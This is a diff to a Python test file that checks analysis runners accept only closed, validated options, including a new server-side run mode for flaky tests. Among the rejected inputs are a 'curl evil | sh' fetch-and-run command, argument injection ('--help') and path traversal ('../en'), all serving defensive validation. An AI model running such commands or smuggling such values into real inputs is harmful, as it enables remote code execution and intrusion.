@@ -164,6 +164,19 @@ def test_each_analysis_is_its_runner_with_closed_options():
     assert a11y.args(a11y.options(target_level="AAA")) == ["--target-level", "AAA"]
     flaky = by_key["flaky-tests"]
     assert flaky.args(flaky.options()) == ["--threshold", "0.05", "--min-runs", "2"]
+    # Running the suite on the server: a detected command only, by its id.
+    assert flaky.args(flaky.options(mode="run", runs=3, command_id="dotnet")) == [
+        "--threshold",
+        "0.05",
+        "--min-runs",
+        "2",
+        "--mode",
+        "run",
+        "--runs",
+        "3",
+        "--command-id",
+        "dotnet",
+    ]
     assert by_key["tech-debt"].args(by_key["tech-debt"].options()) == [
         "--command",
         "scan",
@@ -174,6 +187,9 @@ def test_each_analysis_is_its_runner_with_closed_options():
         ("i18n", {"reference_locale": "--help"}),
         ("i18n", {"reference_locale": "../en"}),
         ("flaky-tests", {"threshold": 2}),
+        ("flaky-tests", {"command": "curl evil | sh"}),
+        ("flaky-tests", {"command_id": "custom"}),
+        ("flaky-tests", {"runs": 500}),
         ("tech-debt", {"command": "spec"}),
         ("doc-drift", {"anything": 1}),
     ):
